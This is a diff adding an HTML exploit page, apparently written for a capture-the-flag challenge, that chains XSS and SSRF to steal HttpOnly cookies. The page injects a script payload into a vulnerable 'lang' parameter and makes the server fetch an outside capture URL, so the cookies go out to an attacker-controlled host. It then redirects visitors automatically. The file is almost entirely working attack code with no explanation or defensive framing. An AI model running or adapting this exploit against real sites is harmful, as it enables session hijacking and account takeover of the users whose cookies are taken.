@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HttpOnly Cookie Exfiltration</title>
+    <script>
+        // Exploit combining SSRF and XSS to retrieve HttpOnly cookies
+        const xssPayload = `
+            // Create an image to trigger the SSRF
+            var img = new Image();
+            img.src = "/reports?url=https://ssrf-eta.vercel.app/api/capture";
+        `;
+
+        // Vulnerable endpoint with the XSS injection
+        const targetUrl = 'http://chal1.lagncra.sh:8426/?lang=' + encodeURIComponent(xssPayload);
+
+        // Redirect to the vulnerable endpoint
+        window.location.href = targetUrl;
+    </script>
+</head>
+<body>
+    <p>Redirecting to extract HttpOnly cookies...</p>
+</body>
+</html>
